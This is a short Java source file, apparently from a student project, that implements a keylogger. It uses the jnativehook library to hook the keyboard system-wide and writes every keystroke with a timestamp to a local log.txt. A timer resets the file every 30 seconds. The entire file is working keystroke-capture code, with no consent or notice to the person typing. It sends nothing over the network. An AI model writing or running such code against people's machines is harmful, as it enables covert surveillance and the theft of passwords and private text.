package pl.pwr.student.lorenc;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalTime;
import java.util.Timer;
import java.util.TimerTask;

public class KeyLogger implements NativeKeyListener {
    private File file;
    private FileWriter fileWriter;

    public KeyLogger() throws Exception {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(this);
        this.file = new File("log.txt");
        this.fileWriter = new FileWriter(file, false);
        new Timer(false).scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try {
                    file.delete();
                    file.createNewFile();
                    fileWriter = new FileWriter(file, false);
                } catch (Exception ignore) {}
            }
        }, 0, 30000);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try {
            String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
            logKeyPressed(keyText);
        } catch (Exception ignore) {
        }
    }

    private void logKeyPressed(String keyText) throws IOException {
        fileWriter.append(LocalTime.now().toString() + " - " + keyText + System.lineSeparator());
        fileWriter.flush();
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }
}
